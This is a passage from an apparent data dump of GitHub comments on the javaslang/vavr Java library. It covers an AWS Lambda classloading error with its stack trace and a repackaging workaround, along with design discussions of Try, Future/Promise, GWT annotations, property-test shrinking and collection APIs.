lection/Iterator$18.class\njavaslang/collection/Iterator$19.class\njavaslang/collection/Iterator$2.class\njavaslang/collection/Iterator$20.class\njavaslang/collection/Iterator$21.class\njavaslang/collection/Iterator$22.class\njavaslang/collection/Iterator$23.class\njavaslang/collection/Iterator$24.class\njavaslang/collection/Iterator$25.class\njavaslang/collection/Iterator$26.class\njavaslang/collection/Iterator$27.class\njavaslang/collection/Iterator$28.class\njavaslang/collection/Iterator$29.class\njavaslang/collection/Iterator$3.class\njavaslang/collection/Iterator$30.class\njavaslang/collection/Iterator$31.class\njavaslang/collection/Iterator$32.class\njavaslang/collection/Iterator$33.class\njavaslang/collection/Iterator$34.class\njavaslang/collection/Iterator$35.class\njavaslang/collection/Iterator$36.class\njavaslang/collection/Iterator$37.class\njavaslang/collection/Iterator$38.class\njavaslang/collection/Iterator$39.class\njavaslang/collection/Iterator$4.class\njavaslang/collection/Iterator$40.class\njavaslang/collection/Iterator$41.class\njavaslang/collection/Iterator$5.class\njavaslang/collection/Iterator$6.class\njavaslang/collection/Iterator$7.class\njavaslang/collection/Iterator$8.class\njavaslang/collection/Iterator$9.class\njavaslang/collection/Iterator.class\njavaslang/collection/IteratorModule$ConcatIterator.class\njavaslang/collection/IteratorModule$DistinctIterator.class\njavaslang/collection/IteratorModule.class\njavaslang/collection/LinearSeq.class\njavaslang/collection/LinearSeqModule$LastIndexOfSlice.class\njavaslang/collection/LinearSeqModule$Search.class\njavaslang/collection/LinearSeqModule.class\njavaslang/collection/LinkedHashMap.class\njavaslang/collection/LinkedHashSet$1.class\njavaslang/collection/LinkedHashSet$SerializationProxy.class\njavaslang/collection/LinkedHashSet.class\njavaslang/collection/List$1.class\njavaslang/collection/List$Cons$SerializationProxy.class\njavaslang/collection/List$Cons.class\njavaslang/collection/List$Nil.class\njavaslang/collection/List.class\njavaslang/collection/ListModule$Combinations.class\njavaslang/collection/ListModule$SplitAt.class\njavaslang/collection/ListModule.class\njavaslang/collection/Map.class\njavaslang/collection/Queue.class\njavaslang/collection/RedBlackTree$1.class\njavaslang/collection/RedBlackTree$Color.class\njavaslang/collection/RedBlackTree.class\njavaslang/collection/RedBlackTreeModule$Empty.class\njavaslang/collection/RedBlackTreeModule$Node.class\njavaslang/collection/RedBlackTreeModule.class\njavaslang/collection/Seq$1Util.class\njavaslang/collection/Seq.class\njavaslang/collection/Set.class\njavaslang/collection/SortedMap.class\njavaslang/collection/SortedSet.class\njavaslang/collection/Stack.class\njavaslang/collection/Stream$1.class\njavaslang/collection/Stream$2.class\njavaslang/collection/Stream$3.class\njavaslang/collection/Stream$4.class\njavaslang/collection/Stream$Cons.class\njavaslang/collection/Stream$Empty.class\njavaslang/collection/Stream.class\njavaslang/collection/StreamModule$AppendElements.class\njavaslang/collection/StreamModule$AppendSelf.class\njavaslang/collection/StreamModule$Combinations.class\njavaslang/collection/StreamModule$ConsImpl.class\njavaslang/collection/StreamModule$DropRight.class\njavaslang/collection/StreamModule$SerializationProxy.class\njavaslang/collection/StreamModule$StreamFactory.class\njavaslang/collection/StreamModule$StreamIterator.class\njavaslang/collection/StreamModule.class\njavaslang/collection/Traversable$1.class\njavaslang/collection/Traversable.class\njavaslang/collection/Tree$1.class\njavaslang/collection/Tree$Empty.class\njavaslang/collection/Tree$Node$SerializationProxy.class\njavaslang/collection/Tree$Node.class\njavaslang/collection/Tree$Order.class\njavaslang/collection/Tree.class\njavaslang/collection/TreeMap$EntryComparator.class\njavaslang/collection/TreeMap.class\njavaslang/collection/TreeModule$FlatMap.class\njavaslang/collection/TreeModule$Map.class\njavaslang/collection/TreeModule$Replace.class\njavaslang/collection/TreeModule$Traversal.class\njavaslang/collection/TreeModule$Unzip.class\njavaslang/collection/TreeModule$Zip.class\njavaslang/collection/TreeModule$ZipAll.class\njavaslang/collection/TreeModule.class\njavaslang/collection/TreeSet.class\njavaslang/collection/Vector$1.class\njavaslang/collection/Vector.class\njavaslang/collection/VectorModule$Combinations.class\njavaslang/collection/VectorModule.class\njavaslang/concurrent/\njavaslang/concurrent/Future.class\njavaslang/concurrent/FutureImpl.class\njavaslang/concurrent/Promise.class\njavaslang/concurrent/PromiseImpl.class\njavaslang/control/\njavaslang/control/Either$1.class\njavaslang/control/Either$Left.class\njavaslang/control/Either$LeftProjection.class\njavaslang/control/Either$Right.class\njavaslang/control/Either$RightProjection.class\njavaslang/control/Either.class\njavaslang/control/Option$1.class\njavaslang/control/Option$None.class\njavaslang/control/Option$Some.class\njavaslang/control/Option.class\njavaslang/control/Try$1.class\njavaslang/control/Try$CheckedConsumer.class\njavaslang/control/Try$CheckedFunction.class\njavaslang/control/Try$CheckedPredicate.class\njavaslang/control/Try$CheckedRunnable.class\njavaslang/control/Try$CheckedSupplier.class\njavaslang/control/Try$Failure.class\njavaslang/control/Try$FatalException.class\njavaslang/control/Try$NonFatalException.class\njavaslang/control/Try$Success.class\njavaslang/control/Try.class\njavaslang/control/Validation$1.class\njavaslang/control/Validation$Builder.class\njavaslang/control/Validation$Builder3.class\njavaslang/control/Validation$Builder4.class\njavaslang/control/Validation$Builder5.class\njavaslang/control/Validation$Builder6.class\njavaslang/control/Validation$Builder7.class\njavaslang/control/Validation$Builder8.class\njavaslang/control/Validation$Invalid.class\njavaslang/control/Validation$Valid.class\njavaslang/control/Validation.class\njavaslang/Function0.class\njavaslang/Function1.class\njavaslang/Function2.class\njavaslang/Function3.class\njavaslang/Function4.class\njavaslang/Function5.class\njavaslang/Function6.class\njavaslang/Function7.class\njavaslang/Function8.class\njavaslang/Kind1.class\njavaslang/Kind2.class\njavaslang/Lazy.class\njavaslang/MatchError.class\njavaslang/Patterns.class\njavaslang/Predicates.class\njavaslang/Tuple.class\njavaslang/Tuple0.class\njavaslang/Tuple1.class\njavaslang/Tuple2.class\njavaslang/Tuple3.class\njavaslang/Tuple4.class\njavaslang/Tuple5.class\njavaslang/Tuple6.class\njavaslang/Tuple7.class\njavaslang/Tuple8.class\njavaslang/Value.class\njavaslang/ValueModule.class\njavaslang/\u03bb$Memoized.class\njavaslang/\u03bb.class\nMETA-INF/maven/io.javaslang/\nMETA-INF/maven/io.javaslang/javaslang/\nMETA-INF/maven/io.javaslang/javaslang/pom.xml\nMETA-INF/maven/io.javaslang/javaslang/pom.properties\njavaslang/match/\njavaslang/match/annotation/\njavaslang/match/annotation/Patterns.class\njavaslang/match/annotation/Unapply.class\njavaslang/match/generator/\njavaslang/match/generator/Generator.class\njavaslang/match/generator/ImportManager$FQN.class\njavaslang/match/generator/ImportManager$Import.class\njavaslang/match/generator/ImportManager.class\njavaslang/match/model/\njavaslang/match/model/ClassModel.class\njavaslang/match/model/MethodModel.class\njavaslang/match/model/ParameterModel.class\njavaslang/match/model/TypeParameterModel.class\njavaslang/match/PatternsProcessor.class\njavaslang/match/UnapplyChecker.class\nMETA-INF/services/\nMETA-INF/services/javax.annotation.processing.Processor\nMETA-INF/maven/io.javaslang/javaslang-match/\nMETA-INF/maven/io.javaslang/javaslang-match/pom.xml\nMETA-INF/maven/io.javaslang/javaslang-match/pom.properties\ncom/\ncom/amazonaws/\ncom/amazonaws/services/\ncom/amazonaws/services/lambda/\ncom/amazonaws/services/lambda/runtime/\ncom/amazonaws/services/lambda/runtime/Client.class\ncom/amazonaws/services/lambda/runtime/ClientContext.class\ncom/amazonaws/services/lambda/runtime/CognitoIdentity.class\ncom/amazonaws/services/lambda/runtime/Context.class\ncom/amazonaws/services/lambda/runtime/LambdaLogger.class\ncom/amazonaws/services/lambda/runtime/LambdaRuntime$1.class\ncom/amazonaws/services/lambda/runtime/LambdaRuntime.class\ncom/amazonaws/services/lambda/runtime/LambdaRuntimeInternal.class\ncom/amazonaws/services/lambda/runtime/RequestHandler.class\ncom/amazonaws/services/lambda/runtime/RequestStreamHandler.class\nMETA-INF/maven/com.amazonaws/\nMETA-INF/maven/com.amazonaws/aws-lambda-java-core/\nMETA-INF/maven/com.amazonaws/aws-lambda-java-core/pom.xml\nMETA-INF/maven/com.amazonaws/aws-lambda-java-core/pom.properties. Amazon says they've fixed the classloader issue. I'll test this out tomorrow and update w/ a confirmation.\nhttps://forums.aws.amazon.com/thread.jspa?threadID=229364. Not looking promising\n{\n  \"errorMessage\": \"java.lang.NoClassDefFoundError: javaslang/\u03bb\",\n  \"errorType\": \"java.lang.BootstrapMethodError\",\n  \"stackTrace\": [\n    \"javaslang.ShadeTest.myHandler(ShadeTest.java:18)\",\n    \"sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\",\n    \"sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\",\n    \"sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\",\n    \"java.lang.reflect.Method.invoke(Method.java:498)\"\n  ],\n  \"cause\": {\n    \"errorMessage\": \"javaslang/\u03bb\",\n    \"errorType\": \"java.lang.NoClassDefFoundError\",\n    \"stackTrace\": [\n      \"java.lang.ClassLoader.defineClass1(Native Method)\",\n      \"java.lang.ClassLoader.defineClass(ClassLoader.java:763)\",\n      \"java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)\",\n      \"java.net.URLClassLoader.defineClass(URLClassLoader.java:467)\",\n      \"java.net.URLClassLoader.access$100(URLClassLoader.java:73)\",\n      \"java.net.URLClassLoader$1.run(URLClassLoader.java:368)\",\n      \"java.net.URLClassLoader$1.run(URLClassLoader.java:362)\",\n      \"java.security.AccessController.doPrivileged(Native Method)\",\n      \"java.net.URLClassLoader.findClass(URLClassLoader.java:361)\",\n      \"java.lang.ClassLoader.loadClass(ClassLoader.java:424)\",\n      \"java.lang.ClassLoader.loadClass(ClassLoader.java:357)\",\n      \"javaslang.ShadeTest.myHandler(ShadeTest.java:18)\",\n      \"sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\",\n      \"sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\",\n      \"sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\",\n      \"java.lang.reflect.Method.invoke(Method.java:498)\"\n    ],\n    \"cause\": {\n      \"errorMessage\": \"javaslang.\u03bb\",\n      \"errorType\": \"java.lang.ClassNotFoundException\",\n      \"stackTrace\": [\n        \"java.net.URLClassLoader.findClass(URLClassLoader.java:381)\",\n        \"java.lang.ClassLoader.loadClass(ClassLoader.java:424)\",\n        \"java.lang.ClassLoader.loadClass(ClassLoader.java:357)\",\n        \"java.lang.ClassLoader.defineClass1(Native Method)\",\n        \"java.lang.ClassLoader.defineClass(ClassLoader.java:763)\",\n        \"java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)\",\n        \"java.net.URLClassLoader.defineClass(URLClassLoader.java:467)\",\n        \"java.net.URLClassLoader.access$100(URLClassLoader.java:73)\",\n        \"java.net.URLClassLoader$1.run(URLClassLoader.java:368)\",\n        \"java.net.URLClassLoader$1.run(URLClassLoader.java:362)\",\n        \"java.security.AccessController.doPrivileged(Native Method)\",\n        \"java.net.URLClassLoader.findClass(URLClassLoader.java:361)\",\n        \"java.lang.ClassLoader.loadClass(ClassLoader.java:424)\",\n        \"java.lang.ClassLoader.loadClass(ClassLoader.java:357)\",\n        \"javaslang.ShadeTest.myHandler(ShadeTest.java:18)\",\n        \"sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\",\n        \"sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\",\n        \"sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\",\n        \"java.lang.reflect.Method.invoke(Method.java:498)\"\n      ]\n    }\n  }\n}\nI updated the aws forum thread, and reached out again to @AWSSupport on twitter. We'll see what happens.. I've finally opened a support ticket to get amazon to dig into this some more. Their assistance on the forums kind of hit a dead end. I'll keep this thread updated if they provide any resolution.. ",
    "medinarrior": "Other than upgrading from javaslang to vavr my solution was the following:\n$ mkdir -p target/aws\n$ cd target/aws/\n$ jar -xvf ../shade-test-0.0.1-SNAPSHOT.jar \n$ zip -r ../shade-test-0.0.1-SNAPSHOT.zip *\nAnd upload the zip file to aws, looks like aws is using unzip instead of jar -xvf\n$ unzip -l shade-test-0.0.1-SNAPSHOT.jar | grep javaslang/\u03bb\n$ unzip -l shade-test-0.0.1-SNAPSHOT.zip | grep javaslang/\u03bb. ",
    "hovenko": "I like the b suggestion provided by @mvh77 in https://github.com/vavr-io/vavr/issues/1382#issuecomment-226686756, to set the interrupt-flag and return a Failure(t), which is probably the safest option considering the Java specification.\nIn addition, would it be possible to add a new method to Try, such as boolean isInterrupted() ?\nOtherwise one would have to re-introduce the try/catch blocks everywhere to catch potential Fatal(InterruptedException), which in turn invalidates the reason to use Try.of, I guess..? :). ",
    "nbardiuk": "Just for reference regarding immutables\nthere is a request to add support of javaslang https://github.com/immutables/immutables/issues/383\nand there is some discussion to add ADTs https://github.com/immutables/immutables/issues/47\n. Do you think such helper would be useful enough to generate together with tuples? \njava\nstatic <T1, T2, R> Function<Tuple2<T1, T2>, R> tuple2(Function2<T1, T2, R> mapper) {\n    return tuple -> tuple.apply(mapper);\n}\njava\n//Stream<Tuple<String, SomeData>> stream\nstream.map(tuple2((name, data) -> \"Hello \" + name));\nstream.map(tuple2(this::someFunction));\n. Yes, it is the main goal. Issue looks related. Yes it matters.\nFor now there is a workaround - a filter of shrink\nShrink.integer().filter(i -> i % 2 == 0)\n\njava\nProperty.def(\"test\")\n                .forAll(Arbitrary.integer().filter(i -> i != 0))\n                .suchThat((i) -> 100 / i == 5)\n                .shrinking(Shrink.integer().filter(i -> i != 0))\n                .check().assertIsSatisfied();\ntest: Falsified after 0 passed tests in 23 ms.\njava.lang.AssertionError: Expected satisfied check result but was \nFalsified(propertyName = test, count = 1, sample = (1), shrinks = 4)\n\nThe proper solution could involve change in generator or arbitrary.\nFor example generator could provide a predicate that checks that a value fits generator ranges.\nOr we could encapsulate Gen and Shrink inside Arbitrary and change them simultaneously by manipulating only Arbitrary.\n. Yes, for me it would be the best solution.\nBut it will require one more change in map function of Arbitrary.\nIn order to transform Shrink<T> into Shrink<U> we need 2 function T->U and U->T because type parameter of Shrink is in both domain and codomain.\nBy the way we don't need Option<Shrink> there is a Shrink.empty() that has the same meaning.. Sure, I will prepare this change. For simple example it sounds the same. \nMaybe composition of Shrink objects is more powerful. For example reducing size for list generator will reduce length of list and its values simultaneously. But Current implementation of Shrink reduces values and length of list separately.\nIf smaller example is smaller only in one dimension (i.e. smaller values but the same length) Shrink has better chance to find it.. ",
    "dmolesUC3": "So far JEP 218 does not appear to be on the roadmap for either JDK 10 or JDK 11, but I suppose it still might be out by 2019/2020. (I don't know whether there are feature lists for any later releases\u2014it\u2019s remarkably difficult to Google Oracle\u2019s new yy.v version numbering scheme.). That's why I suggested adding keys() rather than changing keySet(), but the LinkedHashSet idea is much, much better \u2014 I forgot that a LinkedHashSet is backed by a LinkedHashMap.\nTo do that, though, wouldn't you also need to change the LinkedHashSet constructor to take a LinkedHashMap<T, Object> rather than a LinkedHashMap<T, T>? . Consider also CollectionView for Traversable, e.g.:\n```\nclass CollectionView extends AbstractCollection {\n  private final Traversable delegate;\npublic CollectionView(Traversable delegate) {\n    this.delegate = delegate;\n  }\n@Override\n  public Iterator iterator() {\n    return delegate.iterator();\n  }\n@Override\n  public int size() {\n    if (!delegate.hasDefiniteSize()) {\n      // Per java.util.Collection docs: \n      // \"If this collection contains more than Integer.MAX_VALUE elements, returns Integer.MAX_VALUE.\"\n      return Integer.MAX_VALUE;\n    }\n    return delegate.size();\n  }\n}\n```\n(Mutable is trickier, unfortunately, but (1) less likely to be needed and (2) could probably leverage the scoped mutable views on the collection types.). Hmm. You could say you can view ArraySet as a Seq but only manipulate it as a Set. But I do think that append(), prepend() etc. still make sense most of the time, as well as indexed methods like insert() and removeAt().. @danieldietrich that sounds like a very good solution.. @chb0github I'm not clear on what you're proposing. Access to element m of an n-element HashSet (or LinkedHashSet) isn't O(1), it's O(n).. ",
    "civitz": "First of all: thank you all for the detailed reply.\nYour proposed solutions (both @danieldietrich  and @nbardiuk  variants), are both great from the code clarity point of view. And I also agree on the effort for the generated code. \nSo, in the end, thank you for helping me, and for your time :)\n. ",
    "tfij": "awesome! this is what I expect :)\n. ",
    "ronanM": "I changed the signature : \njava\npublic static <T1, T2> Tuple2<Seq<? extends T1>, Seq<? extends T2>> sequence(Iterable<Tuple2<? extends T1, ? extends T2>> tuples) {\n      Objects.requireNonNull(tuples, \"tuples is null\");\n      return new Tuple2<>(Iterator.ofAll(tuples).map(Tuple2::_1).toList(), Iterator.ofAll(tuples).map(Tuple2::_2).toList());\n}\n. @ruslansennov not yet, sorry.\n. @ruslansennov tests added.\n. Like HList use cases.\n. Scala Tuples with Shapeless :\nhttps://github.com/milessabin/shapeless/wiki/Feature-overview:-shapeless-2.0.0#hlist-style-operations-on-standard-scala-tuples\n. Merged, mvn ok, but I don't know what to do with Break CI build on PRs where committed differ from generated sources ?\n. @ruslansennov Ooops, I thought all files were committed.\n. Tuple0 prepend() & append() added.\n. New PR created #1509 \n. I'm a bit confused, all my code disappear after merging master into tuple-prepend-append branch.\n. ofAll(Iterable<? extends T> iterable, Comparator<? super T> comparator) works for a 'level' comparator.\nSo it can be a bit confusing. Maybe it's better to rename it with this 'level' notion ?\n. Yes, I've imported settings.\n. All other zip function have that parameter named.\n. I follow map and flatMap.\n. With type-hints it doesn't compile. Strange !?!\n. I just push the deletion of this cast.\n. To be as short as possible like _1, _2...\n. ",
    "tskardal": "I've created a pull request #1870. ",
    "AnthonyKot": "JFYI, looks like the error was mentioned by danieldietrich on 24 Aug 2016 is still here:\n\"Test set: io.vavr.idiom.ForBenchmark\nTests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 0.475 sec <<< FAILURE! - in io.vavr.idiom.ForBenchmark\ntestAsserts(io.vavr.idiom.ForBenchmark)  Time elapsed: 0.475 sec  <<< ERROR!\njava.lang.RuntimeException: org.openjdk.jmh.runner.RunnerException: Benchmark caught the exception\n    at io.vavr.idiom.ForBenchmark.testAsserts(ForBenchmark.java:38)\nCaused by: org.openjdk.jmh.runner.RunnerException: Benchmark caught the exception\n    at io.vavr.idiom.ForBenchmark.testAsserts(ForBenchmark.java:38)\nCaused by: org.openjdk.jmh.runner.BenchmarkException: Benchmark error during the run\n    at io.vavr.idiom.ForBenchmark.testAsserts(ForBenchmark.java:38)\". ",
    "eirikm": "Even if max(1, null) shouldn\u2019t be 1 it would be reasonable to assume that\nmax(1, null) would provide the same result/error as max(null, 1), wouldn\u2019t it?\nEirik\n\nOn 14 Aug 2016, at 16:28, Daniel Dietrich notifications@github.com wrote:\nArithmetic operations should only process on defined element.\nE.g. 1 + null is not 1. I would say it is undefined because our arithmetic has no notion for adding an element outside the set of ints to an int.\nSo why max(1, null) should be 1?\nA healthy codebase does not implement additional logical branches for every special case and his dog :-) We should do it as straight forward as possible.\nTherefore we will not include special null handling here.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub https://github.com/javaslang/javaslang/issues/1482#issuecomment-239676496, or mute the thread https://github.com/notifications/unsubscribe-auth/AAezuzLM9W5N1CQ4oDvIrJiwA8VAkNXsks5qfyYjgaJpZM4Jh7WK.\n. \n",
    "AlparSzabados": "Hi @danieldietrich,\nShould only final classes implement Serializable explicitly, or every class that has a serialVersionUID?\ne.g.: (Checked)Function0-8, MatchError, AbstractMap, Queue, AbstractsQueue, Seq...\nThanks!\n. Can you please provide more information? (could you find an example?). Alright, thank you for the answer. I will look for something else to fix.. @danieldietrich Thank you for your response! I will try to tackle it in a few days :D. I extracted dropUntil and dropRightUntil into Collections without empty and implemented dropRightUntil and dropRightWhile in Seq.  . @danieldietrich Thank you for your detailed response. I will try to modify it in a few days. Thanks again for the detailed description \ud83d\udc4d \ud83d\ude03 . Could you please write an example on how this differs from .tupled()?\nInstead of\njava\n@Test\npublic void shouldTupled() throws Throwable {\n    final CheckedFunction3<Integer, Integer, Integer, Integer> f = (i1, i2, i3) -> i1 + i2 + i3;\n    final Tuple3<Integer, Integer, Integer> t = API.Tuple(1, 2, 3);\n    assertThat(f.tupled().apply(t)).isEqualTo(1 + 2 + 3);\n}\nit should be possible to do\njava\n@Test\npublic void shouldTupled() throws Throwable {\n    final CheckedFunction3<Integer, Integer, Integer, Integer> f = (i1, i2, i3) -> i1 + i2 + i3;\n    final Tuple3<Integer, Integer, Integer> t = API.Tuple(1, 2, 3);\n    assertThat(f.apply(t)).isEqualTo(1 + 2 + 3);\n}\n?. No problem! Thank you for looking into it. . @paplorinc sure! 98% would be nice and I think it's doable. . @paplorinc .27% to go. I will look for other potential victims \ud83d\ude08 . swapping the reference will save us an extra negation.. Array, Vector and CharSeq are basically the same, should I extract it to Collections?. swapped dropUntil with dropWhile to reflect code order.. adapted dropUntil/dropWhile tests. thank you, done :). I rearranged the methods to: drop, dropUntil, dropWhile, dropRight, dropRightUntil, dropRigtWhile, it looks more logical to me, what do you think?. Done in: https://github.com/javaslang/javaslang/pull/1766. Done in: https://github.com/javaslang/javaslang/pull/1766. done, and thanks. done. Thanks for that! My alphabet is rusty.... I made it without a default value (not even implicitly null). There are no values to fill in the missing cells. This makes sense because transpose is supposed to work for matrixes, so if you have missing values, that's not a matrix. In these cases it will still transpose, but the transposition of the transposition will not be the same as the original (a least not in every case). . minor:\n* @return a transposed {@link Vector}. -> * @return a transposed {@link Vector} matrix. ?. Added test for Left(1).get() just to make it symmetric.. Made it final and changed number to 1 . Done. \ud83d\udc4d  for 42:P. It's not throwing so it should be renamed. . you could inline this. Great tests \ud83d\udc4d . ",
    "viktorklang": "Hi @danieldietrich,\nThanks for inviting me here :)\nLong brain dump ahead, I hope you can glean any value from it!\n\nWe aligned to Scala when creating Future (for read operations) and Promise (for write operations).\n\nSounds cool :)\n\nBut Promise looks too heavy.\n\nWhat is the definition of heavy here?\n\nIt is a wrapper around a Future that provides statements to mutate the underlying Future. \n\nTechnically, at least in Scala, it is not a wrapper.\n\nPromise is not monadic opposed to Future.\n\nThis is a statement, but comes across ass criticism. Should it be monadic, what would the value be? The proposed solution is not monadic either?\n\nWhen starting async programming with Scala it was first hard for me to get the difference between Future and Promise and when to use which.\n\nCould this be solved with better / more documentation?\nI saw a section on scheduling considerations, and I'd like to recommend the following, from my former colleague @havocp, which has been a great guiding principle to avoid rather nasty surprises in runtime behavior: http://blog.ometer.com/2011/07/24/callbacks-synchronous-and-asynchronous/\nI think the idea of providing a completion function is an interesting one:\nscala\ndef futureOf[U](f: (Try[U] => Boolean) => Unit)(implicit ec: ExecutionContext): Future[U] = // 1\n  Future.successful(()).flatMap[U](_ => { // 2\n    val p = Promise[U]() // 3\n    f(p.tryComplete _) // 4\n    p.future // 5\n  })\nLines explained:\n1: The supplied function f takes a function of Try[U] which will be used to complete the underlying Promise/Future. It returns Boolean because otherwise there is no way to tell if the completion was successful (Promise.tryComplete. Promise.complete, Promise.(try)success and Promise.(try)failure can all be implemented on top of that.)\nIt needs the implicit ExecutionContext to know where to evaluate f since f could be a \"long running\", IO-using or otherwise effectful function (since it returns Unit)\n2: In Scala 2.12 we could use Future.unit.flatMap instead (cached instance of Future.successful(())), but we need to defer execution to the EC. And we want to have isomorphic behavior to other function application of future, so if f throws exceptions then we need to fail the resulting future, otherwise we risk having it hang around unresolved.\n3: We create a new promise of the desired result type since we need to transport the values sent to us to the returned Future\n4: We ETA-expand the tryComplete function and pass it into f to let the user code complete the resulting Future\n5: we make sure to return the resulting Future to flatMap, carrying the resulting value back to the returned Future of the futureOf method\nALTERNATIVELY:\nscala\ndef future[T]: ((Try[T] => Boolean), Future[T]) = {\n  val p = Promise[T]()\n  (p.tryComplete _, p.future)\n}\nThe alternative is arguably much simpler.\nPromise: The Good & the Bad\nGood:\n- Communicates intent, Promise carries more important information, most notably: The \"owner\" of a Promise has promised to complete it. Example: def x(p: Promise[T]) carries more information than: def x(f: Try[T] => Boolean)\n- Gives access to check Promise::isCompleted without having to complete it (compared to Try[T] => Boolean\n- Through Promise::future there is also possibility to read, not only write (compared to Try[T] => Boolean\n- Cheap: Allocating a Scala DefaultPromise is a single allocation, with no additional allocation for the Future instance.\nBad:\n- One more thing to learn (besides Future)\nSo, I think, my current opinion I that what you propose is a nice, complementary, way of completing Promises. In my experience, I rarely need to deal with Promises directly, but when I do, having the intent which is Promise is really valuable, both to the reader of the code, and the writer of the code.\nI hope the Future of your day is great!\nCheers,\n\u221a\n. Addendum: There are some really interesting news in the Futures for Scala 2.12, which I've described in a blog series here\n. @danieldietrich Thanks for inviting me! I'll play around with the idea of an alternative Future \"factory\" when I have some time to focus :)\n\nIn Future/Promise it all boils down to compositional calls on top of a thin, hardened core.\n\nThis. So much.\n. @danieldietrich Definitely looks promising\u2014thanks for improving my understanding :-)\nStay awesome!\n. Ping @sethtisue\n. But it is 2 extra branches and method calls? Perhaps put the method size\nabove default for inlining? (31bytes IIRC)\n\nCheers,\n\u221a\nOn Nov 4, 2016 12:54 AM, \"Ichoran\" notifications@github.com wrote:\n\nCould be. I definitely benchmarked that, but I benchmarked it before the\nGenBCode change IIRC, and it's possible that I forgot to benchmark both\nwith and without optimization. That's a huge penalty for two equalities\nthat ought to be false!\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/javaslang/javaslang/pull/1658#issuecomment-258308964,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAAqd7ttMtiRms5nBzuXHamPA7gUzcLKks5q6nRSgaJpZM4Kouq1\n.\n. @paplorinc I think this is worth investigating, @Ichoran / @SethTisue is there an issue for this in the scala/scala tracker?\n. \n",
    "hepin1989": "Alias to Scala 2.13. We should keep this sync with Scala 2.13. FYI https://github.com/netty/netty/blob/4.1/common/src/main/java/io/netty/util/concurrent/EventExecutorGroup.java#L105. thank you very much for this fix. https://github.com/jsuereth/scala-arm. I think both libraries are great, but as user, we mostly only choose one and stick with it:)\nwhich one is better, sometimes it's just a piece of personal taste.. I am using it with javaslang.xx.List\u3002then all people know it's a List.. why not with SBT?. The same question just asked on scala's gitter:)\n\nMap#apply looks up the key and returns the value (or throws an exception if not found)\n. No overloaded methods for there function? like DoubleFunction?. I see, I thought it does another kind of function.. @danieldietrich I think they will move it in 2.14, it's planed in 2.13 but you know:). I can only say if that will be done, they should be done in 1.0, as they are the most basic types:) \nThere is no type alias in Java so, I don't know.\n. @danieldietrich FYI: https://github.com/scala/scala/pull/7425 ,I think this should be done in 1.0 if you decided to .. sleep?\n. you could take a look at monix Task.timeout and netty EventLoop,this kind of delay would cause issue ,javaslang is great,we are using it at taobao\ud83d\ude03\n. @danieldietrich not like that,netty implement it via a dedicated delayed task queue\nhttps://github.com/netty/netty/blob/4.1/common/src/main/java/io/netty/util/concurrent/AbstractScheduledEventExecutor.java#L46\n. shouldn't this be nano?. \n",
    "tbroyer": "\nAlso: What happens if an application inspects the annotations of a class/method by reflection and GwtIncompatible is not on the classpath? ClassNotFoundException?\n\ngetAnnotations and getDeclaredAnnotations would simply not return it (because it has @Retention(CLASS); it'd probably throw if it had @Retention(RUNTIME)).\n\nI would use the provided scope only for dependencies which are known to be present at runtime.\n\nAh, if only Maven had a compile only scope\u2026 but it only has <scope>provided</scope> and/or <optional>true</optional> for dependencies that aren't transitively resolved. Either that or using a deploy POM different from the build POM.\n. Wrt that -strict warning and the fact that tests don't catch those errors: the tests in vavr-gwt are run with the org.codehaus.mojo:gwt-maven-plugin, which defaults to running tests in devmode (despite GWT having switched to using prod mode by default); and GWT doesn't allow running tests in strict mode (-strict or -failOnError) anyway, so you need to catch those errors outside of tests (e.g. compiling a sample app, or possibly running the GWT compiler with the -validateOnly flag) where -failOnError can be used.. Please use the maven/push-gwt.sh script instead; it will \"unbundle\" most dependencies and declare them as Maven dependencies.\n. This should be:\nxml\n<jvmArgs>\n  <arg>-Xmx2048m</arg>\n</jvmArgs>\nI'm surprised (actually, not really) Maven doesn't complain.\n. Without <executions> and without a special <packaging>, the plugin won't do anything unless explicitly invoked from the command-line. Actually, I don't quite understand why this sample has <packaging>jar</packaging> (and includes the maven-bundle-plugin); I think this change is missing switching the packaging to gwt-app.\n. Same here\n. The Apache License allows you to do just that; but I believe you should then add the Google copyright to your LICENSE file, or at least add a note that parts of the code have a Google copyright.\nBut actually you don't need to copy the file: GWT expects an annotation with a simple of GwtIncompatible, in any package, will ignore any annotation attribute, and will only process the annotation on classes, fields, constructors and methods, and that's it. So just create such an annotation in your project that fulfills that contract, and put your own license (and copyright) on it.\n. Having it @Documented might be a good thing too.\n. Maybe better rely on the 2.8.0-SNAPSHOT for now, pending 2.8.0 final release that will include that change.\n. > http://stackoverflow.com/questions/3567413/why-doesnt-a-missing-annotation-cause-a-classnotfoundexception-at-runtime\nAh yes, I remember better now: @Retention(CLASS) is only visible when looking at the class file itself (e.g. through ASM, or an annotation processor), @Retention(RUNTIME) makes it available through reflection (iff the class is available); so @Retention(CLASS) really is safe.\n. ",
    "ahammel": "Looks fixed on master :)\n. Although now I can't even get those tests to fail on 2.0.3, so maybe I'm crazy  \u00af_(\u30c4)_/\u00af \nI'll have another look in the morning.\n. ",
